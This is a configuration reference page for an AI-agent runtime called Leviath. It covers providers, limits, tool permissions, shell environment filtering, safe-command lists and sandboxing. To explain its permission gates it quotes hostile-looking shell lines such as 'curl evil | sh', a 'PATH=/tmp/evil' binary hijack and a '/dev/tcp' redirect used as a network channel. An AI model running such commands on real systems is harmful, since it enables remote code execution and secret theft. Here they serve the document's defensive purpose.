---
title: Configuration
description: Every key in ~/.leviath/config.toml, with its type and default.
group: Reference
group_order: 3
order: 1
---

# Configuration (`config.toml`)

Machine-wide settings live in `~/.leviath/config.toml`. [`lev setup`](/docs/cli) writes it for you,
and everything below is optional: an install with one provider key works with no other key set.

This page is the exhaustive list. The concept pages explain *why* each knob exists; this one is
where you look up the exact name, type, and default.

> [!NOTE]
> The daemon watches this file and reloads it when it changes, so an edit takes effect on the
> **next** `lev run` with no restart. Boot-time wiring (providers, MCP connections, telemetry
> exporters) still needs `lev daemon restart`. See [the daemon docs](/docs/daemon#config-changes-take-effect-on-the-next-run).

## Top level

```toml
default_provider     = "anthropic"   # provider used when a blueprint names none
default_model        = "claude-sonnet-4-5"   # optional model override
agent_paths          = ["~/projects/my-agents"]   # extra directories scanned for blueprints
openrouter_api_key   = "sk-or-..."   # env fallback: OPENROUTER_API_KEY
ollama_base_url      = "http://localhost:11434"   # env fallback: OLLAMA_HOST
request_timeout_secs = 900           # per-request HTTP timeout to a provider
taint_tracking       = false         # global master switch, see below
batch_tool_hint      = true          # global master switch, see below
shell_hint           = true          # global master switch, see below
```

| Key | Type | Default | Notes |
|---|---|---|---|
| `default_provider` | string | `"anthropic"` | |
| `default_model` | string | unset | |
| `agent_paths` | array of paths | `[]` | Searched in addition to `~/.leviath/agents` |
| `openrouter_api_key` | string | unset | Falls back to `OPENROUTER_API_KEY` |
| `ollama_base_url` | string | unset | Falls back to `OLLAMA_HOST`, then `http://localhost:11434` |
| `request_timeout_secs` | integer | unset | Unset means the 15 minute ceiling. A stage's `[stages.<name>.model] request_timeout_secs` wins for that stage |
| `taint_tracking` | bool | `false` | Turns on [taint tracking](/docs/security) for every agent. With it off, an agent can still opt in itself |
| `batch_tool_hint` | bool | `true` | Adds a short hint telling the model it may batch independent tool calls |
| `shell_hint` | bool | `true` | Adds a short hint describing the shell a stage will get. Only says anything on platforms that need it, today just Windows |

All three of those cascade: a stage setting beats an agent setting, which beats this file.

### System-prompt hints

`batch_tool_hint` and `shell_hint` are the two hints Leviath writes into a stage's system prompt on
its own. Both are on by default, both cascade stage over agent over this file, and both sit at the
front of the cacheable prefix so they cost nothing after the first call:

```toml
# config.toml: off for this machine
shell_hint = false
```

```toml
# a blueprint: back on for this one agent, off for one stage of it
[agent]
shell_hint = true

[stages.plan]
shell_hint = false
```

`shell_hint` only reaches a stage that advertises the `shell` tool, and only on a platform whose
shell needs explaining. On Linux and macOS it is inert whatever you set it to. See
[Built-in tools](/docs/tools#which-shell-you-get) for what it says on Windows.

## `[providers]`

Provider credentials. Every key falls back to the matching environment variable, so you can leave
the file empty in CI.

```toml
[providers]
anthropic_api_key   = "sk-ant-..."   # env fallback: ANTHROPIC_API_KEY
openai_api_key      = "sk-..."       # env fallback: OPENAI_API_KEY
google_api_key      = "..."          # env fallback: GOOGLE_API_KEY
claude_code_enabled = false          # opt in to the Claude Code CLI transport
claude_code_binary  = "/usr/local/bin/claude"   # unset resolves `claude` on PATH
claude_code_effort  = "medium"       # low | medium | high | xhigh | max
fallback_order      = ["anthropic/claude-sonnet-5", "openai/gpt-5.6-mini"]
```

`claude_code_enabled` is off unless you turn it on. See
[Providers](/docs/providers#claude-code-transport) for the terms note that goes with it.

`fallback_order` is where a run goes when the provider it is using stops being usable: out of
credits, or a rejected key. Entries are `provider/model` pairs, best first, tried after the stage's
own model list and your default model. One naming a provider you have not configured is skipped.
It is read per run, so a change takes effect on the next `lev run` with no restart. See
[Providers](/docs/providers#a-host-wide-fallback-chain).

## `[limits]`

```toml
[limits]
max_concurrent_inferences = 8    # in-flight requests per model without its own pool entry
max_concurrent_tools      = 8    # agents whose tool batches may run at once, daemon-wide
default_max_iterations    = 50   # fallback cap for a stage that sets none
exact_token_counting      = false
script_shell_timeout_secs = 60
stall_timeout_secs        = 60   # fail a run that can never dispatch
dead_cycles_before_relief = 10   # widen the tool lane after this long going nowhere
finished_retention_secs   = 300  # keep a finished run in `lev ps` this long
wedge_timeout_secs        = 0    # fail a run nothing can reach any more; 0 is off
provider_failures_before_open  = 3     # pull a provider after this many failures in a row
provider_circuit_cooldown_secs = 300   # how long before it is tried again
interaction_timeout_secs  = 3600 # release a prompt nobody answered
```

| Key | Default | Notes |
|---|---|---|
| `max_concurrent_inferences` | `8` | The [inference pool](/docs/engine#inference-pools) cap, per model |
| `max_concurrent_tools` | `8` | Size of the shared tool worker pool. Clamped to at least 1 |
| `default_max_iterations` | `50` | A stage's own `max_iterations` always wins |
| `exact_token_counting` | `false` | Count each request exactly before sending it. See below |
| `script_shell_timeout_secs` | `60` | Cap on a Rhai script tool's `shell()` host call |
| `stall_timeout_secs` | `60` | Fail a run that can never dispatch. See below |
| `dead_cycles_before_relief` | `10` | 30-second cycles with a full [tool lane](/docs/engine#the-tool-lane) and nothing moving before the lane widens. `0` never widens it |
| `finished_retention_secs` | `300` | How long a finished run stays in [`lev ps`](/docs/cli#runs-that-have-finished). See below |
| `wedge_timeout_secs` | `0` (off) | Fail a run nothing can reach any more. See below |
| `provider_failures_before_open` | `3` | Failures in a row before a provider is pulled. See below |
| `provider_circuit_cooldown_secs` | `300` | How long a pulled provider waits before one request tests it. A success restores it, a failure restarts the wait |
| `interaction_timeout_secs` | `3600` | How long a prompt may go unanswered. See below |

Six of those need more than a table cell.

**`exact_token_counting`** measures each assembled request before sending it and refuses one that
would overflow the window. On providers with a remote counting endpoint that costs a network round
trip per inference, so it is off by default.

**`stall_timeout_secs`** only fires for something the runtime cannot resolve on its own. Today that
means a stage whose provider is not configured: the run is ready to work and has nowhere to send the
request. Waiting for a busy model's pool is ordinary backpressure and is never failed, however long
it takes. `0` waits forever.

**`finished_retention_secs`** keeps a run visible after it ends, so a script polling on an interval
can see *how* it ended rather than finding it gone. `0` drops it immediately. The record is held in
memory, so a daemon restart clears it whatever you set.

**`wedge_timeout_secs`** fails a run that is sitting in a state no part of the engine can reach,
rather than leaving it reported as running. It never fires on a run that is merely slow: an agent
waiting on the model, a tool, its sub-agents, or a person is exempt however long it takes. It is off
by default because it fails runs, and that should be your decision. `300` is sensible if something
outside Leviath is tracking your slots. See [External work queues](/docs/work-queues).

**`provider_failures_before_open`** counts failures only you can fix, such as an exhausted account
or a rejected key, before that provider is taken out of service for every run. Three rather than one,
because a single payment error can just be one oversized request. `0` disables it and leaves per-run
failover to cope alone.

**`interaction_timeout_secs`** puts a deadline on any prompt that waits on a person: `ask_user_*`,
tool approvals, taint gates, and interaction points. When it expires the daemon resolves the prompt
and lets the run continue. An expiry *denies* an approval and tells the model no answer came. It
never counts as consent. `0` waits indefinitely. See
[when nobody answers](/docs/interaction#when-nobody-answers).

<a id="security"></a>

## `[security]`

Machine-wide switches that are not part of the per-tool permission cascade.

```toml
[security]
allow_seed_commands        = true
allow_local_network        = false
allow_env_vars             = ["MY_PROVIDER_KEY"]
allow_blueprint_read_paths = false
allow_blueprint_safe_commands = false
allow_blueprint_permissions   = false
shell_env                  = "filtered"   # filtered | strict | custom | inherit
shell_env_withhold         = []          # names withheld under shell_env = "custom"
read_paths                 = ["~/.leviath/runs", "glob:~/design-docs/**"]
credential_store           = "file"   # file | keychain
```

| Key | Default | Notes |
|---|---|---|
| `allow_seed_commands` | `true` | Whether a blueprint's `seed = { command = "..." }` regions may run at all. They execute at spawn, before the first approval prompt, so a seed also has to be covered by `[safe_commands]` - there is nobody to ask in the moment. `--no-seed-commands` refuses them for one run |
| `allow_local_network` | `false` | Whether agent fetches may reach loopback, private, and link-local addresses. Off, this blocks cloud metadata, your own `lev serve`, and the LAN |
| `allow_env_vars` | `[]` | Credential-shaped variable names a Rhai script may read through `env_var()`. Matching is exact and case-insensitive, and there is no wildcard |
| `allow_blueprint_read_paths` | `false` | Honors every blueprint's `[read_paths]` as written. Prefer a per-agent grant for anything you did not author |
| `allow_blueprint_safe_commands` | `false` | Honors every blueprint's `[safe_commands]` as written. Off, an installed agent cannot pre-approve its own shell |
| `allow_blueprint_permissions` | `false` | Honors every blueprint's `[tool_permissions]` even where it exceeds the built-in default for a tool you have not configured. Off, a blueprint may still pre-approve `web_search` and `web_fetch`; anything else is clamped to the default. Name the tool under `[agent_tool_permissions.<agent>]` to grant it per agent instead |
| `shell_env` | `"filtered"` | Which of the daemon's environment variables a shell command inherits. See below |
| `shell_env_withhold` | `[]` | The names `shell_env = "custom"` withholds. Ignored under every other mode |
| `read_paths` | `[]` | Machine-wide read grants. A grant only applies to a path the blueprint also declares, so listing one here opens nothing by itself |
| `credential_store` | `"file"` | `keychain` moves secrets to the OS credential store. Run `lev auth migrate` after changing it |

Grant entries (here and in `[agent_read_paths]`) take three forms: an exact path, which grants its
subtree; `glob:` patterns; and `regex:` patterns, auto-anchored. Both patterns are matched against
the symlink-resolved real path and are written with `/` on every OS. `~/` expands to your home, and
a relative entry resolves against the run's workdir. Full walkthrough in
[Security](/docs/security#reading-outside-the-workdir).

## `[agent_read_paths.<agent>]`

Per-agent read grants, the itemized counterpart of `allow_blueprint_read_paths`.

```toml
[agent_read_paths.cto]
allow = ["~/.leviath/runs", "glob:~/design-docs/**"]
```

An agent's declarations mean nothing until one of these grants lands, so `lev validate <agent>`
checks each declared entry against this file and prints the block above, filled in, for whatever it
does not find. `lev list` and `lev ps` carry the same counts. If you wrote blueprints against a
build where the blueprint allowlist stood on its own, read the
[upgrade note](/docs/security#upgrading-from-011).

## Tool permissions

`[tool_permissions]` sets a machine-wide ceiling. A blueprint's own `[tool_permissions]` may
tighten it but never loosen it. For a tool you have not listed here there is no ceiling to clamp
against, so a blueprint may raise it no higher than the built-in default - except `web_search` and
`web_fetch`, which read-only research agents pre-approve. To let a blueprint go further, name the
tool under `[agent_tool_permissions.<agent>]`, or set `[security] allow_blueprint_permissions`.

```toml
[tool_permissions]
shell      = "ask"     # allow | ask | deny
write_file = "ask"
read_file  = "allow"
```

`[agent_tool_permissions.<agent>]` is the escape hatch. Naming an agent replaces the global value
for it, and that becomes the ceiling its blueprint is clamped against.

```toml
[agent_tool_permissions.coder]
shell = "allow"
```

Resolution order, narrowest first: launch flag, stage, agent, this file, built-in default. A launch
flag (`--allow`, `--yolo`) can turn `ask` into `allow` but can never lift a `deny`. The built-in
defaults are in [Built-in tools](/docs/tools).

### What a shell command inherits

The daemon holds provider keys, `LEVIATH_API_TOKEN`, and whatever the person who started it had
exported. Handing all of that to every shell command means one `env` in tool output leaks the lot.
`shell_env` decides how much a `shell` tool call, a Rhai `shell()`, and a region's command seed
inherit. All three answer to the same setting, so a script with `shell` is not a way around the
`env_var` gate.

| Mode | What it withholds |
|---|---|
| `filtered` (default) | Credential-shaped names, **except `SSH_AUTH_SOCK`** - so `git push` over agent keys still works |
| `strict` | The same, plus `SSH_AUTH_SOCK`, `AWS_PROFILE`, `AWS_REGION`, `KUBECONFIG`, `NETRC`. Breaks `git push`, `aws` and `kubectl` in a shell tool until you list what you need |
| `custom` | Exactly the names in `shell_env_withhold`, and nothing inferred |
| `inherit` | Nothing |

Toolchain variables pass through under every mode: `PATH`, `HOME`, `CARGO_HOME`, `JAVA_HOME`,
`VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`, `TERM`. `allow_env_vars` hands a specific name
over under every mode too, so one list means one thing whichever surface asks.

```toml
[security]
shell_env          = "custom"
shell_env_withhold = ["MY_INTERNAL_TOKEN", "LEGACY_CRED"]
allow_env_vars     = ["MY_PROVIDER_KEY"]
```

Be clear about what this buys. With `cat` and `grep` on the default safe list, a granted shell can
read `~/.leviath/config.toml` and find the provider key anyway. This is defence in depth against
accidental leakage - an `env` in tool output, a `printenv` in a log, a subprocess that phones home -
and it closes the command-seed case, where nothing was ever approved. It is not a boundary. For one,
use `[sandbox]`.

## `[safe_commands]` and `[agent_safe_commands.<agent>]`

A permission is per tool name, which for the shell is a choice between a prompt on every `ls` and no
prompt on `curl evil | sh`. These entries are argument-scoped, and can only turn an `ask` into an
`allow` - never a configured `deny`.

```toml
[safe_commands]
defaults = true                 # ship the read-only verb list
tools    = ["read_files"]
shell    = ["cargo test", "rg"]

[agent_safe_commands.software-engineer]
shell           = ["./gradlew", "env:GRADLE_OPTS"]
allow_blueprint = true          # honour this agent's own [safe_commands]
```

| Key | Default | Notes |
|---|---|---|
| `defaults` | `true` | The shipped read-only verb list. An entry on it must not be able to write a file, run another program, or open a connection under any flag, which is why `find`, `sed`, `awk`, `sort`, `xargs`, `env` and `cargo` are absent - and why `uniq` (writes its second operand), `tree` (`-o`) and `rg` (`--pre` runs a command) were removed. Add any of them back by name if you want them unprompted |
| `tools` | `[]` | Tools that never prompt whatever their arguments. Built-in names, or MCP names as advertised (`server__tool`) |
| `shell` | `[]` | A program, optionally with the subcommand that narrows it. `git status`, never `git` or `cargo test --lib`. Also `env:NAME`, below |
| `allow_blueprint` | `false` | Per-agent only. Honour that agent's own `[safe_commands]` block |

A shell entry covers the program it names with any arguments, so `cat` covers `cat notes.md`. It
does not cover a line that also runs something else: `cat notes.md && curl evil` still asks, because
`curl` is in neither the safe list nor any grant. `lev approvals safe` prints what is in effect and
which file put it there.

### Environment assignments

A command line decides more than which program runs. `PATH=/tmp/evil ls` runs `ls` from a directory
of the caller's choosing, and `export PATH=/tmp/evil; ls` does the same a segment earlier, so naming
the program alone would let the safe list approve somebody else's binary. Each variable a line binds
is therefore its own key, spelled `env:NAME`:

```toml
[safe_commands]
shell = ["env:RUST_LOG", "env:CARGO_TERM_COLOR"]
```

`RUST_LOG=debug cargo test` then needs `cargo test` and `env:RUST_LOG`, and granting one variable
grants exactly that one. There is no entry that covers every variable at once, and no program name
widens onto an `env:` key.

Two constructs are refused rather than keyed, because they install code to run at a point no program
name in the line describes: `trap`, and defining or aliasing a name with `function`, `alias` or
`unalias`. A line containing one of those prompts every time and cannot be pre-approved. `set -euo
pipefail` is unaffected, since shell options change nothing about which program a name resolves to.

### Redirects

`echo x > file` writes a file, and no tool name in the call says so. A shell call that redirects
output is therefore held to the `write_file` policy as well as the shell's own: where `write_file`
is `deny` the call is refused, and it is never quieter than a `write_file` call would have been.
That is what stops a redirect being a spelling of `write_file` that a `deny` never sees.

Each target is also its own key, so an approval names what is being written:

```
Allow cat notes.md, >/tmp/report.txt for this run
```

Unlike a program, a write cannot be pre-approved in a config file - `[safe_commands] shell` rejects
any entry beginning with `>`. A write is approved by a person, per target, or not at all.

Three shapes cost nothing, because they write nothing that outlives the call: `/dev/null`,
`/dev/stdout`, `/dev/stderr`, `/dev/tty` and `/dev/fd/*`; descriptor duplications such as `2>&1`;
and read redirects, since a program that can read a file could already read it. So `cargo build >
/dev/null 2>&1` and `cat notes.md 2>/dev/null` are as quiet as they were.

Two shapes cannot be granted at all. A target that only exists after expansion (`> $OUT`) names a
different file on every run, and bash's `> /dev/tcp/host/port` is a socket rather than a file, which
makes the redirect a network channel no program name describes. Both prompt every time.

<a id="tool_script_permissions"></a>

## `[tool_script_permissions]`

Layer 3 of the permission model: what a Rhai script tool may *do*, independent of whether the tool
is visible or approved. Each key is `allow`, `deny`, or `inherit`.

```toml
[tool_script_permissions]
http_get   = "inherit"
http_post  = "inherit"
shell      = "inherit"
read_file  = "inherit"
write_file = "inherit"
env_var    = "inherit"
```

Every field defaults to `inherit`. For `shell`, `read_file`, and `write_file`, that defers to the
agent's own permission for the equivalent built-in and permits the call only when it resolves to
`allow`. For `http_get`, `http_post`, and `env_var`, which have no built-in equivalent, `inherit`
permits the call; the tool itself is still gated by the other three layers. See
[Rhai tools](/docs/rhai-tools).

## `[sandbox]`

The machine-wide default sandbox for tool execution. An agent's or stage's own `[sandbox]`
overrides it, and the two resolve to the **stronger** of the pair, so an installed agent can tighten
its sandbox but never turn one off.

```toml
[sandbox]
kind           = "container"   # none | namespace | container
image          = "debian:bookworm-slim"
engine         = "docker"      # docker | podman | nerdctl | finch; auto-detected when unset
network        = true
mounts         = ["/opt/toolchain:ro"]
persist        = false
on_unavailable = "error"       # error | warn
```

Unset entirely, agents run tools on the host. Details in
[Security and sandboxing](/docs/security#sandboxes).

## `[rate_limits.<provider>]`

Client-side limits enforced before every call, for the built-in providers (`anthropic`, `openai`,
`google`, `openrouter`).

```toml
[rate_limits.anthropic]
requests_per_minute = 50
tokens_per_minute   = 40000
```

This shapes request *rate*. `[limits] max_concurrent_inferences` bounds *concurrency*. Both apply.
Script providers configure theirs under `[model_providers.<name>.rate_limit]` instead.

## `[model_capabilities.<model_id>]`

Per-model overrides that take precedence over the provider's built-in capability table. Useful for
a local or self-hosted model Leviath does not know.

```toml
[model_capabilities.my-local-llama]
supports_temperature = true
supports_streaming   = true
supports_tools       = true
supports_system_prompt = true
max_context_tokens   = 32768
max_output_tokens    = 4096
```

<a id="model_providersname"></a>

## `[model_providers.<name>]`

Optional overrides for a [Rhai script provider](/docs/rhai-providers). A script activates by being
referenced and existing in `~/.leviath/providers/`; this table only supplies extras.

```toml
[model_providers.groq]
script   = "groq"        # defaults to <name>.rhai
api_key  = "..."
base_url = "https://api.groq.com/openai/v1"

[model_providers.groq.rate_limit]
requests_per_minute = 30
tokens_per_minute   = 100000
```

Any other key you add is forwarded verbatim to the script's `initialize(config)`.

## `[[mcp_servers]]`

[MCP](/docs/mcp) tool servers. `lev mcp add` writes these for you.

```toml
[[mcp_servers]]
name      = "github"
transport = "http"        # stdio | http; inferred from command/url when omitted
url       = "https://api.example.com/mcp"
headers   = { Authorization = "Bearer ${GITHUB_TOKEN}" }

[[mcp_servers]]
name      = "local-fs"
transport = "stdio"
command   = "npx"
args      = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
env       = { LOG_LEVEL = "debug" }
```

Values in `headers` and `env` may use `${VAR}` to pull from the environment.

## `[nudge]`

Machine-wide defaults for the empty-response nudge: the `[System]` message injected when a stage's
model replies with text before making any tool call.

```toml
[nudge]
enabled = true
max     = 3
text    = "You have tools available. Please use them to complete the task."
```

All three keys are optional and each is overridden independently by an agent's `[agent.nudge]` or a
stage's `[stages.<name>.nudge]`. `text` supports `{stage}` and `{regions}` placeholders. Defaults
are on, `max = 3`, and a built-in message. See [Nudging](/docs/stages#nudging).

## `[title]`

Auto-generated short run titles.

```toml
[title]
enabled  = true
provider = "anthropic"
model    = "claude-haiku-4-5-20251001"
```

`enabled` defaults to `true`. `provider` and `model` fall back to the run's own first-stage
provider and model.

## `[webhook]`

Delivery tuning for completion webhooks. Every field has a default, so the whole section can be
omitted. The webhook URL itself is per-spawn, not configured here; see [the API docs](/docs/api).

```toml
[webhook]
max_retries   = 3       # retries after the first attempt; 0 disables retries
base_delay_ms = 500     # doubles per retry, capped at max_delay_ms
max_delay_ms  = 30000
timeout_secs  = 10      # per attempt
```

## `[observability]`

OpenTelemetry export, off by default. Full walkthrough in [Observability](/docs/observability).

```toml
[observability]
enabled      = true
exporter     = "otlp"    # otlp | stdout | none
endpoint     = "http://localhost:4318"
service_name = "leviath"
```

`endpoint` falls back to `OTEL_EXPORTER_OTLP_ENDPOINT`, then `http://localhost:4318`. Leviath
exports OTLP over **HTTP/protobuf**, so a collector's gRPC port (4317) will not work.
`service_name` falls back to `OTEL_SERVICE_NAME`, then `"leviath"`.

## Environment variables

Leviath reads a `.env` file from the working directory unless `LEVIATH_SKIP_DOTENV` is set. Only
that one file, never a walk up the tree, and a variable you have already exported always wins.

A cloned repository *is* the working directory, so its `.env` is content somebody else wrote.
Credentials from it load normally - that is what the feature is for - but the handful of names that
decide where configuration comes from or what gets executed are ignored, with a warning naming them:
the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`, and the `LD_*` and `DYLD_*` loader
variables. Without that, one line of `LEVIATH_CONFIG_PATH` in a repository you cloned would point
Leviath at a config file of its choosing, with its own MCP server commands and tool permissions.
Export those yourself if you meant them.

| Variable | Effect |
|---|---|
| `LEVIATH_HOME` | Redirects the whole data root. Every home-relative path honors it, which is what makes an isolated test or a second install possible |
| `LEVIATH_CONFIG_PATH` | Path to an exact config file, bypassing the default location |
| `LEVIATH_SKIP_DOTENV` | Set to skip `.env` loading |
| `LEVIATH_RUNS_DIR` | Overrides where run directories are written |
| `LEVIATH_API_TOKEN` | Bearer token for `lev serve`. The server refuses to start without one |
| `LEVIATH_CONTROL_TIMEOUT_SECS` | Deadline for one control-socket request |
| `LEVIATH_DASHBOARD_LOG_PATH` | Overrides the dashboard log file |
| `LEVIATH_DUMP_REQUEST_DIR` | Writes each outgoing provider request to this directory, for debugging |
| `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, `OPENROUTER_API_KEY` | Provider key fallbacks for `[providers]` |
| `OLLAMA_HOST` | Fallback for `ollama_base_url` |
| `OTEL_EXPORTER_OTLP_ENDPOINT`, `OTEL_SERVICE_NAME` | Fallbacks for `[observability]` |
| `EDITOR`, `VISUAL` | Editor used when a prompt opens one |
| `XDG_CONFIG_HOME` | Where `policy.toml` and scripted rules are looked up. Linux only |

> [!WARNING]
> A variable whose name looks like a credential is not readable by Rhai scripts through `env_var()`
> unless you list it in `[security] allow_env_vars`. That closed an exfiltration path where a
> two-line script tool could read a provider key and POST it elsewhere with no prompt.

## Where things live on disk

Everything persistent sits under the data root, `<home>/.leviath`, which `LEVIATH_HOME` redirects.

| Path | Holds |
|---|---|
| `config.toml` | This file, created `0600` |
| `mcp-auth.json` | MCP OAuth tokens, created `0600` |
| `runs/` | One directory per run: `meta.json`, `context.json`, `stages.json`, the `run.lvr` journal, per-stage logs |
| `agents/` | Blueprints installed by `lev add` |
| `providers/` | Drop-in [Rhai provider](/docs/rhai-providers) scripts |
| `tools/` | Drop-in [Rhai tool](/docs/rhai-tools) scripts, offered to every agent |
| `dashboard.log` | `lev dash` diagnostics |

The daemon's control socket, its token, its pid file, and a build marker live here too.

## `policy.toml`

Taint-gate policy lives in its own file, not in `config.toml`. It sits in your platform's config
directory, managed with [`lev policy`](/docs/cli):

| Platform | Path |
|---|---|
| macOS | `~/Library/Application Support/leviath/policy.toml` |
| Linux | `~/.config/leviath/policy.toml`, or `$XDG_CONFIG_HOME/leviath/policy.toml` when set |
| Windows | `%APPDATA%\leviath\policy.toml` |

```toml
[[allowlist]]
tool             = "http_post"
to               = ["https://hooks.internal/*"]
max_sensitivity  = "internal"   # public | internal | private

[mcp_overrides."github.create_issue"]
sensitivity = "internal"
direction   = "outbound"
clearance   = "internal"
```

Scripted rules live as `.rhai` files in a `rules/` directory beside `policy.toml`, so
`~/Library/Application Support/leviath/rules/` on macOS and `~/.config/leviath/rules/` on Linux. See
[Rhai tools](/docs/rhai-tools#policy-rules) and [Security](/docs/security#taint-tracking-experimental).
